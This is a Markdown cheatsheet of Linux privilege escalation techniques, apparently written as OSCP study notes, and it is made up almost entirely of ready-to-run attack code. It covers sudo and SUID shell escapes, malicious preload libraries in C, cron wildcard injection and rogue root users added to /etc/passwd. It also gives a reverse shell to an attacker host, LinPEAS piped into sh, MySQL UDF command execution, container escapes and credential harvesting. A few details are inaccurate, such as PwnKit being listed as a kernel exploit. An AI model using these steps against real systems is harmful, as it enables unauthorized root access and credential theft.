# Linux Privilege Escalation Methodology

> *Operational Workflow: TTY Stabilization -> System & Context Enumeration (Phase 1) -> Vector Identification (Phase 2) -> Targeted Exploitation (Vectors 1-14) -> Root Access*
> *Essential Cheatsheets: [[🐧 linux-commands|Linux Commands]], [[🐢 reverse-shells|Reverse Shells]], [[⛏️ hashcat-john|Hashcat & John]], [[🔀 ligolo-chisel|Ligolo & Chisel]]*

---

# Phase 1: Initial Enumeration and Shell Stabilization

> *Run these manual commands immediately upon landing a low-privileged shell. Log all outputs into your operational notes.*

### Shell Stabilization (Mandatory Prerequisite)
Before attempting privilege escalation exploits, stabilize your interactive shell. Unstable shells frequently crash, freeze on password prompts (`sudo`, `su`), or fail on interactive binaries:

```bash
# Step 1: Spawn a proper TTY shell using Python
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Set terminal variable
export TERM=xterm

# Step 3: Background shell and set raw terminal emulation (run on Kali)
# Press: Ctrl + Z
stty raw -echo; fg

# Step 4: Re-initialize terminal window dimensions
reset
stty rows 38 columns 160
```
> *See [[08-Shells-Payloads]] for advanced TTY stabilization techniques, socat, and alternate shell handlers.*

### 1.1: Identity and Group Context
```bash
whoami
id
hostname
```
- Inspect groups: Membership in `sudo`, `admin`, `docker`, `lxd`, `disk`, or `shadow` represents an immediate, high-priority privilege escalation path.

### 1.2: System and Kernel Signature
```bash
uname -a                    # Kernel version and architecture (x86 vs x86_64)
cat /proc/version           # Kernel build and compiler distribution details
cat /etc/issue              # OS release banner
cat /etc/os-release         # Comprehensive distribution details
```

### 1.3: Sudo Execution Privileges
```bash
sudo -l                     # Check FIRST: What commands can this user execute as root?
```
- If `sudo -l` executes without a password or displays `(ALL : ALL) NOPASSWD:`, proceed directly to [[#Vector 1: Sudo]].

### 1.4: User Accounts and Home Directories
```bash
cat /etc/passwd             # List all registered user accounts
cat /etc/passwd | grep -E "sh$" # Filter accounts with valid interactive login shells
ls -la /home/               # Check accessibility of other user home folders
```

### 1.5: Network Interfaces and Internal Listening Ports
```bash
ip a || ifconfig            # Network interfaces and IP subnets
ip route                    # Active routing table and default gateway
ss -tulnp || netstat -tulnp # Active internal TCP and UDP listening services
```
- Look for localhost-only bindings (`127.0.0.1` or `::1`) such as port 3306 (MySQL), 5432 (PostgreSQL), 8080 (Web applications), or 6379 (Redis).

### 1.6: High-Value Files and Recent Activity Sweep
```bash
history 2>/dev/null         # Review command history for cleartext credentials
cat ~/.bash_history ~/.zsh_history ~/.profile 2>/dev/null
ls -la /opt/ /tmp/ /var/tmp/ /var/backups/ /var/mail/
find / -maxdepth 3 -name "*.txt" -o -name "*.conf" -o -name "*.bak" -o -name "id_rsa*" 2>/dev/null | head -n 40
```

### 1.7: Active Process Inspection
```bash
ps aux                      # All running processes
ps aux | grep root          # Processes executing with root privileges
```

---

# Phase 2: Privilege Escalation Vectors

> *Triage Matrix: Select the corresponding escalation vector based on your initial enumeration findings.*

| Observed System Finding | Target Escalation Vector |
| --- | --- |
| `sudo -l` displays allowed commands or environment flags | [[#Vector 1: Sudo]] |
| Custom or non-standard SUID/SGID binaries discovered | [[#Vector 2: SUID and SGID Binaries]] |
| File capabilities returned via `getcap -r` | [[#Vector 3: Linux Capabilities]] |
| Automated tasks in `/etc/crontab` or detected via `pspy` | [[#Vector 4: Cron Jobs]] |
| Writable directories present in current user `$PATH` | [[#Vector 5: PATH Manipulation]] |
| NFS export configured with `no_root_squash` | [[#Vector 6: NFS Export Abuse (no_root_squash)]] |
| Legacy kernel version matching known CVEs | [[#Vector 7: Kernel Exploits]] |
| Internal management service listening on `127.0.0.1` | [[#Vector 8: Internal Services Port Forwarding]] |
| Write access on `/etc/passwd`, `/etc/shadow`, or `/etc/sudoers` | [[#Vector 9: Writable Sensitive System Files]] |
| Exposed private keys, history passwords, config files | [[#Vector 10: SSH Keys and Credential Reuse]] |
| MySQL daemon running as root without root password | [[#Vector 11: MySQL User Defined Functions (UDF)]] |
| Membership in `docker`, `lxd`, or `disk` groups | [[#Vector 12: Docker, LXD, and High-Privilege Groups]] |
| Writable service definitions triggered by systemd timers | [[#Vector 13: Systemd Timers and Services]] |
| Writable `/etc/ld.so.conf.d/` directory or configuration files | [[#Vector 14: Writable Shared Library Paths (ld.so.conf.d)]] |

---

## Vector 1: Sudo

> *The most frequent and dependable privilege escalation vector in the OSCP syllabus. Always verify `sudo -l` first.*
>
> **Operating System Mechanics:**
> The `/etc/sudoers` configuration file controls administrative execution policies.
> Syntax `(ALL : ALL)` indicates that the user can execute the command as any user and any group. The `NOPASSWD:` tag bypasses password authentication.
> At the kernel level, the SUID binary `sudo` issues a `setresuid(0, 0, 0)` system call to elevate process credentials before executing the target binary via `execve()`.

### Verification
```bash
sudo -l
```

### Exploit: GTFOBins Execution
If `sudo -l` permits executing a system binary as root:
```
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
```

Query [GTFOBins](https://gtfobins.github.io/) for the permitted binary under the `sudo` filter. Common examples:

```bash
# vim
sudo vim -c '!bash'

# find
sudo find / -exec /bin/bash \; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# less / more
sudo less /etc/shadow    # Inside pager: !bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# env
sudo env /bin/bash

# nmap (legacy versions supporting interactive shell)
sudo nmap --interactive
nmap> !sh

# yum (CentOS / RHEL package manager plugin exploitation)
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```

### Exploit: Environment Preservation (LD_PRELOAD)
If `sudo -l` contains the configuration directive `env_keep+=LD_PRELOAD`:

```c
// Save as /tmp/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
# Compile shared library
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles

# Execute any allowed sudo binary with LD_PRELOAD
sudo LD_PRELOAD=/tmp/preload.so [ANY_ALLOWED_BINARY]
```

### Exploit: Shared Library Search Path (LD_LIBRARY_PATH)
If `sudo -l` contains `env_keep+=LD_LIBRARY_PATH`:

```bash
# 1. Identify which shared libraries the allowed binary links against
ldd /usr/sbin/apache2
# Example output includes: libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

```c
// Save as /tmp/libcrypt.c with matching function constructor
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# 2. Compile malicious library with identical naming into /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c

# 3. Execute binary with LD_LIBRARY_PATH pointed to /tmp
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

### Exploit: Application-Specific File Disclosure Abuse
If a binary lacks GTFOBins shell-escape functions, check if it can read or write arbitrary system files:
```bash
# Apache2 configuration syntax error leakage
sudo apache2 -f /etc/shadow
# The first line of /etc/shadow is returned in the syntax error diagnostic output
```

---

## Vector 2: SUID and SGID Binaries

> *Files configured with the Set-User-ID (SUID) bit run with the privileges of the file owner (typically root), regardless of the invoking user.*
>
> **Operating System Mechanics:**
> The SUID bit is an inode attribute (octal 4000). When `execve()` executes a binary with this bit set, the Linux kernel sets the process Effective User ID (EUID) to match the file owner.
> The Real User ID (RUID) remains unchanged, identifying who launched the process. To retain elevated access in modern shells (`bash`), the `-p` parameter is required; otherwise, `bash` resets the EUID to the RUID on startup.

### Verification
```bash
# Find all SUID executables owned by root across the system
find / -perm -u=s -type f 2>/dev/null

# Alternative search displaying octal permissions and file details
find / -type f -perm -04000 -ls 2>/dev/null
```

### 2.1: GTFOBins Standard Binaries
Compare discovered binaries against [GTFOBins SUID filters](https://gtfobins.github.io/#+suid):

```bash
# python (SUID)
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash (SUID)
bash -p

# find (SUID)
find / -exec /bin/bash -p \; -quit

# cp (SUID): Overwrite /etc/passwd with custom root user
# Step 1: Generate password hash
openssl passwd -1 -salt hacker Password123!
# Output: $1$hacker$TdQVaHnOMmXYS1YZ9ISjm/

# Step 2: Create modified passwd file locally and overwrite /etc/passwd
echo 'hacker:$1$hacker$TdQVaHnOMmXYS1YZ9ISjm/:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su hacker
```

### 2.2: Known Vulnerabilities in SUID Binaries
Run version checks against discovered custom or outdated packages:
```bash
# Example: exim4 local privilege escalation (CVE-2016-1531)
searchsploit exim 4.84
```

### 2.3: Shared Object Injection
If a custom SUID binary attempts to load a non-existent shared object (`.so`):

```bash
# Step 1: Trace system calls during execution to identify missing libraries
strace /usr/local/bin/custom_suid 2>&1 | grep -iE "open|access|no such file"
# Target output: openat(AT_FDCWD, "/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT
```

```c
// Step 2: Write malicious library matching the missing file path
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
# Step 3: Compile shared object and re-execute SUID binary
mkdir -p /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
/usr/local/bin/custom_suid
```

### 2.4: PATH Manipulation on Unqualified Binary Execution
When a SUID binary executes external system commands without absolute paths:

```bash
# Inspect strings inside the SUID binary
strings /usr/local/bin/backup_suid | grep -iE "system|exec|popen|service|curl"
# Discovered call: "service apache2 status" (missing /usr/sbin/service)

# Exploit: Place malicious executable named 'service' in /tmp and prepend to PATH
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

/usr/local/bin/backup_suid
```

### 2.5: Bash Function Export (Bash < 4.2-048)
On older distributions, Bash allows exporting functions named after absolute paths:
```bash
# Verify bash version (< 4.2-048 required)
/bin/bash --version

# Define and export function matching the absolute path invoked by the binary
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

/usr/local/bin/backup_suid
```

### 2.6: Bash Debug Mode and PS4 Variable (Bash < 4.4)
On Bash versions prior to 4.4, debug environment variables are inherited across subshells:
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/backup_suid
/tmp/rootbash -p
```

---

## Vector 3: Linux Capabilities

> *Linux capabilities divide root's absolute power into granular slices. A binary can hold specific privileges (such as setting user IDs or raw packet crafting) without having the full SUID bit.*
>
> **Operating System Mechanics:**
> Capabilities are assigned as file system extended attributes:
> - `cap_setuid`: Allows the process to manipulate its UID (`setuid(0)`), enabling instant root privilege escalation.
> - `cap_dac_override`: Bypasses discretionary read, write, and execute permission checks on all files.
> - `cap_net_raw`: Permits arbitrary socket binding and raw packet forging.

### Verification
```bash
# Search for all binaries assigned capabilities
getcap -r / 2>/dev/null
```

### Exploitation
Compare discovered capabilities against [GTFOBins Capabilities filter](https://gtfobins.github.io/#+capabilities).

```bash
# Python configured with cap_setuid+ep
# Output: /usr/bin/python3 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl configured with cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Vim configured with cap_setuid+ep
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'

# Tar or alternative utility with cap_dac_override (read or write arbitrary sensitive files)
# Read /etc/shadow directly using tar:
tar -cvf /tmp/shadow.tar /etc/shadow
tar -xvf /tmp/shadow.tar -C /tmp/
cat /tmp/etc/shadow
```
> ⚠️ **Warning:** Capabilities do not show up in standard SUID `find` searches. Always run `getcap -r / 2>/dev/null` separately.

---

## Vector 4: Cron Jobs

> *Scheduled tasks executing as root. If you can modify the script, abuse wildcard expansions, or write to directories checked by cron's PATH, you gain root execution.*
>
> **Operating System Mechanics:**
> The `crond` daemon reads scheduling configuration from:
> - `/etc/crontab` and `/etc/cron.d/*`: System-wide tables that specify the executing user.
> - `/var/spool/cron/crontabs/*`: Per-user scheduling tables.
> - `/etc/cron.{hourly,daily,weekly,monthly}/*`: Scripts executed sequentially by `run-parts`.
> **Wildcard Expansion Vulnerability:** Shells expand `*` into a space-separated list of filenames before invoking the command. If a filename matches command flags (e.g., `--checkpoint=1`), the utility interprets that filename as an argument.

### Verification
```bash
# Inspect system crontab files
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# Inspect current user crontab
crontab -l

# Monitor real-time process execution using pspy (catches unlisted or fast-running cron jobs)
./pspy64
```

### 4.1: Writable Cron Script
If an existing cron job executes a script owned or writable by your user:
```bash
# Append reverse shell payload to the writable script
echo 'bash -i >& /dev/tcp/[KALI_IP]/443 0>&1' >> /path/to/backup.sh

# Start listener on Kali and await cron execution
nc -lvnp 443
```

### 4.2: Missing Cron Script (PATH Abuse)
If `/etc/crontab` defines a custom PATH containing a writable directory before standard system paths:
```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin
* * * * * root check_system.sh
```
```bash
# Create the missing script in your writable directory
echo '#!/bin/bash' > /home/user/check_system.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' >> /home/user/check_system.sh
chmod +x /home/user/check_system.sh

# Await execution, then spawn root shell
/tmp/rootbash -p
```

### 4.3: Wildcard Injection (tar, rsync, 7z)
When a cron job executes `tar czf /tmp/backup.tar.gz *` inside a directory:

```bash
# Inside the directory where the wildcard runs:
# 1. Create a script to execute
echo 'cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash' > /path/to/exploit.sh
chmod +x /path/to/exploit.sh

# 2. Create checkpoint option files
touch '/path/to/--checkpoint=1'
touch '/path/to/--checkpoint-action=exec=sh exploit.sh'

# 3. Once cron triggers tar, spawn the resulting SUID shell
/tmp/rootbash -p
```

---

## Vector 5: PATH Manipulation

> *When a privileged script or SUID binary executes external binaries without specifying absolute paths, hijack execution by prepending a writable directory to `$PATH`.*

### Verification
```bash
# Check current PATH configuration
echo $PATH

# Inspect scripts or SUID binaries for unqualified commands
strings /usr/local/bin/status_checker | grep -E "system|popen|exec"
# Discovered execution: "cat /var/log/syslog" (unqualified cat command)
```

### Exploitation
```bash
# Step 1: Create malicious executable named 'cat' in /tmp
echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash -p' >> /tmp/cat
chmod +x /tmp/cat

# Step 2: Prepend /tmp to PATH environment variable
export PATH=/tmp:$PATH

# Step 3: Run the target binary
/usr/local/bin/status_checker
```

---

## Vector 6: NFS Export Abuse (no_root_squash)

> *If the target server exports an NFS mount configured with `no_root_squash`, write operations by remote root (UID 0) retain root ownership on the server.*

### Verification
```bash
# On the compromised target:
cat /etc/exports | grep -i no_root_squash

# From Kali:
showmount -e [TARGET_IP]
```

### Exploitation
```bash
# On Kali: Mount the exported share locally
mkdir /tmp/nfs_mount
sudo mount -t nfs -o vers=3 [TARGET_IP]:/shared_folder /tmp/nfs_mount -nolock

# On Kali: Copy bash into mount and set SUID bit as root
sudo cp /bin/bash /tmp/nfs_mount/rootbash
sudo chown root:root /tmp/nfs_mount/rootbash
sudo chmod +s /tmp/nfs_mount/rootbash

# On the compromised target: Execute the newly created SUID binary
/shared_folder/rootbash -p
```
> *See [[01-Enumeration#Phase 9: NFS (Port 2049)]] for additional NFS flags and network mounting procedures.*

---

## Vector 7: Kernel Exploits

> ⚠️ **Caution: Last Resort.** Kernel exploits can cause kernel panics, system crashes, and machine lockouts. In the OSCP exam, exhaust all configuration and credential vectors before attempting kernel exploits.

### Verification
```bash
uname -a
cat /proc/version
cat /etc/os-release
```

### Verification and Suggesters
```bash
# Query Searchsploit from Kali
searchsploit linux kernel [VERSION]

# Run Linux Exploit Suggester on the target machine
wget http://[KALI_IP]/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh
```

### High-Yield OSCP Kernel Vulnerabilities
| Linux Kernel Range | CVE Reference | Vulnerability Name |
| --- | --- | --- |
| **Linux 2.6.22 - 3.9** | CVE-2016-5195 | Dirty COW (Copy-on-Write) |
| **Linux 3.13 - 3.19** | CVE-2015-1328 | Overlayfs Privilege Escalation |
| **Linux 4.x - 5.x** | CVE-2021-4034 | PwnKit (`pkexec` memory corruption) |
| **Linux 5.8 - 5.16** | CVE-2022-0847 | Dirty Pipe (Pipe buffer overwrites) |

```bash
# Compiling and executing exploit
gcc -pthread exploit.c -o exploit
chmod +x exploit
./exploit
```

---

## Vector 8: Internal Services Port Forwarding

> *Administrative services and internal APIs often listen exclusively on `127.0.0.1` or `::1`, frequently running as root or without authentication.*

### Verification
```bash
ss -tulnp | grep -E "127.0.0.1|::1"
netstat -tulnp | grep -E "127.0.0.1|::1"
```

### Port Forwarding and Exploitation
When internal ports (such as 8080, 8443, 3306, 6379, 9000) are identified:
```bash
# Method A: Port forward using SSH local forwarding (if credentials exist)
ssh -L 8080:127.0.0.1:8080 [USER]@[TARGET_IP]

# Method B: Port forward using Chisel
# On Kali: chisel server -p 8000 --reverse
# On Target: ./chisel client [KALI_IP]:8000 R:8080:127.0.0.1:8080
```
> *See the [[🔀 ligolo-chisel|Ligolo and Chisel Cheatsheet]] for full tunneling syntax.*

---

## Vector 9: Writable Sensitive System Files

### Verification
```bash
# Check write permissions on authentication files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/security/opasswd

# Search for any world-writable files owned by root
find / -writable -type f -user root 2>/dev/null
```

### Exploit: Writable etc-passwd
If `/etc/passwd` is writable, append a root-equivalent user (UID 0):
```bash
# Step 1: Generate password hash
openssl passwd -1 -salt toor Password123!
# Output: $1$toor$9mE000.vQ3f1xJzP2b7rZ/

# Step 2: Append user to /etc/passwd
echo 'toor:$1$toor$9mE000.vQ3f1xJzP2b7rZ/:0:0:root:/root:/bin/bash' >> /etc/passwd

# Step 3: Switch to the newly created root user
su toor
```

### Exploit: Writable etc-shadow
If `/etc/shadow` is writable, generate a SHA-512 hash and replace root's existing hash:
```bash
# Generate SHA-512 hash
mkpasswd -m sha-512 Password123!

# Edit /etc/shadow and replace root's password hash
# Before: root:$6$oldhash...:18700:0:99999:7:::
# After:  root:$6$newhash...:18700:0:99999:7:::
su root
```

---

## Vector 10: SSH Keys and Credential Reuse

### 10.1: SSH Private Keys Inspection
```bash
# Search for readable private keys across the filesystem
find / -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_ecdsa*" 2>/dev/null
ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
```
If an unencrypted private key is discovered:
```bash
chmod 600 id_rsa
ssh -i id_rsa root@[TARGET_IP]
```

### 10.2: Command History Analysis
```bash
# Inspect all command history files
cat ~/.bash_history ~/.zsh_history ~/.nano_history ~/.mysql_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null
```
Look for command executions containing hardcoded passwords:
```bash
mysql -u root -pPassword123!
sshpass -p 'SecretPass' ssh user@host
```

### 10.3: Web Application Configuration Files (Database Credentials)
> 💡 **OSCP Reality:** Database credentials located in web configurations frequently match the system passwords of local users or root. Always test recovered passwords across all local users (`su -`).

```bash
# WordPress configuration
cat /var/www/html/wp-config.php

# Joomla configuration
cat /var/www/html/configuration.php

# Drupal configuration
cat /var/www/html/sites/default/settings.php

# Search custom web frameworks for connection strings
grep -rnE "DB_PASSWORD|password|secret|pass" /var/www/ /opt/ 2>/dev/null | head -n 30
```
> *Test all recovered passwords against: [[01-Enumeration#Credential Reuse Checklist]].*

---

## Vector 11: MySQL User Defined Functions (UDF)

> *If MySQL runs as root (`ps aux | grep mysql`) and root access is accessible without a password, load a User Defined Function (UDF) to execute operating system commands as root.*

### Verification
```bash
# Check if MySQL daemon runs under UID 0 (root)
ps aux | grep mysql

# Test passwordless local authentication
mysql -u root
```

### Exploitation
```bash
# Compile the raptor UDF shared object
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```sql
-- Connect to MySQL and create the UDF function
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

-- Execute arbitrary commands as root
select do_system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash');
```

```bash
# Spawn root shell
/tmp/rootbash -p
```

---

## Vector 12: Docker, LXD, and High-Privilege Groups

> *Users belonging to specific administrative groups can leverage group privileges to obtain host root access.*

### 12.1: Docker Group Exploitation
Members of the `docker` group can mount the host's root filesystem inside a container:
```bash
# List available local container images
docker images

# Mount the host root filesystem (/) into container at /mnt and access via chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# If alpine is missing, replace with any discovered local image name:
docker run -v /:/mnt --rm -it [IMAGE_NAME] chroot /mnt /bin/bash
```

### 12.2: LXD and LXC Group Exploitation
Members of the `lxd` group can create privileged containers with full host filesystem access:
```bash
# On Kali: Build minimal Alpine image for LXD
# (git clone https://github.com/saghul/lxd-alpine-builder.git && sudo ./build-alpine)
# Transfer the resulting alpine-v*.tar.gz to target

# On Target: Import and launch privileged container
lxc image import ./alpine-v3.13-x86_64.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh

# Inside container: Host root filesystem is accessible at /mnt/root
cd /mnt/root
```

### 12.3: Disk Group Exploitation
Members of the `disk` group possess direct read and write access to raw disk block devices:
```bash
# Identify root filesystem partition
df -h
# Output: /dev/sda1 or /dev/nvme0n1p1

# Dump sensitive files directly from raw disk using debugfs
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

---

## Vector 13: Systemd Timers and Services

> *Systemd timers trigger corresponding service units on a schedule. If a timer runs as root and references a writable service file, modify the service definition to execute code.*

### Verification
```bash
# List all active systemd timers
systemctl list-timers --all

# Inspect status and path of corresponding service unit
systemctl status [TIMER_NAME].timer
cat /etc/systemd/system/[SERVICE_NAME].service /lib/systemd/system/[SERVICE_NAME].service 2>/dev/null
```

### Exploitation
If the `.service` file is writable by your current user:
```ini
[Unit]
Description=Scheduled Maintenance

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"
```
Wait for the timer to trigger, or if allowed:
```bash
/tmp/rootbash -p
```

---

## Vector 14: Writable Shared Library Paths (ld.so.conf.d)

> *The dynamic linker (`ld.so`) loads shared libraries configured in `/etc/ld.so.conf` and `/etc/ld.so.conf.d/`. If these configuration directories or files are writable, divert library loading to arbitrary code.*

### Verification
```bash
ls -la /etc/ld.so.conf /etc/ld.so.conf.d/
```

### Exploitation
If `/etc/ld.so.conf.d/` is writable:
```bash
# Step 1: Create a custom library configuration pointing to /tmp/lib
echo "/tmp/lib" > /etc/ld.so.conf.d/malicious.conf

# Step 2: Identify a library required by a root binary
# Step 3: Compile malicious library into /tmp/lib/libtarget.so.1
# Step 4: When ldconfig runs (or upon system reboot/root cron), the hijacked library executes
```

---

# Phase 3: Automated Enumeration Tools

> *Execute automated enumeration tools only AFTER completing targeted manual checks.*

### LinPEAS
```bash
# Host LinPEAS on Kali
# On Kali: python3 -m http.server 80

# Execute directly in memory on target without touching disk
curl -s http://[KALI_IP]/linpeas.sh | sh

# Alternative: Write to disk and log output
wget http://[KALI_IP]/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.txt
```

### pspy (Process Monitor)
`pspy` snoops on running processes without requiring root privileges, capturing cron jobs, transient background scripts, and process arguments:
```bash
wget http://[KALI_IP]/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

---

# Phase 4: LinPEAS Output Decision Tree and Triage Priority

Review LinPEAS findings in this strict order of priority:

1. **Cleartext Passwords and History Artifacts:**
   - Database credentials in web configuration files (`wp-config.php`, `configuration.php`).
   - Plaintext passwords in `~/.bash_history` or command arguments.
   - *Action:* Test passwords across all system accounts using `su -`.

2. **Sudo Privileges (`sudo -l`):**
   - Commands marked `NOPASSWD:` or environment overrides (`LD_PRELOAD`).
   - *Action:* Cross-reference permitted binary on GTFOBins.

3. **Custom SUID/SGID Binaries:**
   - Any non-standard executables outside default system packages.
   - *Action:* Inspect strings, trace with `strace`, test for missing libraries and relative PATH execution.

4. **Scheduled Cron Jobs and Systemd Timers:**
   - Periodic jobs running as root that execute writable scripts or invoke wildcards (`*`).
   - *Action:* Overwrite script or inject checkpoint flags.

5. **High-Privilege Group Memberships:**
   - User in `docker`, `lxd`, `disk`, or `shadow` groups.
   - *Action:* Mount root filesystem or read raw storage blocks.

6. **Writable Sensitive System Files:**
   - Writable permissions on `/etc/passwd`, `/etc/shadow`, or `/etc/sudoers`.
   - *Action:* Append new UID 0 user or replace root hash.

7. **Kernel Exploits:**
   - Legacy kernels with verified public exploit code.
   - *Action:* Confirm kernel version and test compiler compatibility.

---

# Phase 5: Quick Reference Privilege Escalation Checklist

```
☐ sudo -l                                -> GTFOBins / LD_PRELOAD / LD_LIBRARY_PATH
☐ find / -perm -u=s -type f 2>/dev/null  -> SUID -> GTFOBins / strace / strings / searchsploit
☐ getcap -r / 2>/dev/null                -> Capabilities -> GTFOBins
☐ cat /etc/crontab                        -> Writable scripts? Wildcards? Missing files?
☐ echo $PATH                             -> Unqualified commands in SUID / cron?
☐ cat /etc/exports                        -> NFS no_root_squash?
☐ ps aux | grep root                     -> MySQL as root? Custom background services?
☐ ss -tulnp                              -> Localhost-only listening ports (127.0.0.1)?
☐ ls -la /etc/passwd /etc/shadow          -> Writable authentication files?
☐ find / -name "id_rsa*" 2>/dev/null     -> Readable SSH private keys?
☐ cat ~/.*history                         -> Passwords in bash/zsh/mysql history?
☐ cat /var/www/html/wp-config.php        -> Database credentials for password reuse?
☐ id                                     -> Member of docker, lxd, or disk groups?
☐ Run LinPEAS & pspy                     -> Automate deep scanning and cron detection
```
